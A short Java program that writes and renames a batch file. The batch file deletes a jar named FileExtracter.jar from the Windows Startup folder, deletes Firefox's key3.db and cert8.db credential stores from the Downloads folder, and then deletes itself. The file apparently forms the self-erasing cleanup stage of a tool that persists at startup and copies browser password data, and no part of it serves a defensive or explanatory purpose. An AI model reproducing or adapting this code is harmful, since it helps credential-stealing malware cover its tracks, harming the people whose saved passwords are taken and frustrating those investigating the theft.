package Delete;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
 
public class Delete {
	public static void main(String[] args) {
		try {
 //stuff to put into bat
			String address = "\"%USERPROFILE%\\Downloads\\";
		    String del = "\r\ndel ";
		    String content = "del \"%Appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\FileExtracter.jar\" "
		    				+del+address+"\\key3.db\" "
		    				+del+address+"\\cert8.db\" "
		    				+del+address+"\\del.bat\" ";
			
		    
		    File file = new File("del.txt");
 
			// if file doesnt exists, then create it
			if (!file.exists()) {
				file.createNewFile();
			}
 
			FileWriter fw = new FileWriter(file.getAbsoluteFile());
			BufferedWriter bw = new BufferedWriter(fw);
			bw.write(content);
			bw.close();
 
			System.out.println("Done");
 
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		//convert to BAT file
	    File file = new File("del.txt");
	    File file2 = new File("del.bat");
	    file.renameTo(file2);
	}
}